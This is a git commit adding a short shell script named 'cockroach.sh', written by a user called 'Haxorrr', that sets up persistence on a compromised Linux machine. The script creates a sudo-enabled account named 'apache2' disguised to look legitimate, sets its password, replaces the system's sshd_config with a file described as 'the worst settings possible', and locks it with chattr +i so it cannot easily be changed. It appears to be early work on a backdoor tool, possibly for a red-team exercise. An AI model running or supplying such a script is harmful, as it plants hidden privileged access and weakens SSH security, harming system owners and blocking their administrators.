261bd57a3ed5d9ed122fdfa7e0d0ffae6b4dde00
Haxorrr <pvickersbiz@gmail.com>
2023-10-22 23:08:33 -0400

    starting out

---
+++ cockroach.sh
@@ -0,0 +1,14 @@
+#!/bin/sh
+
+# First, we're going to create a new user account named apache2 with home directory
+# /var/www/apache2 to look somewhat legitimate
+mkdir /var/www/apache2
+useradd -d /var/www/apache2 -s /bin/bash apache2
+usermod -aG sudo apache2
+passwd apache2
+
+# Next, we're going to go ahead and change the settings in their sshd_config file
+# to the worst settings possible with the sshd_config file in this directory, and make it
+# immutable.
+cp sshd_config /etc/ssh/sshd_config
+chattr +i /etc/ssh/sshd_config
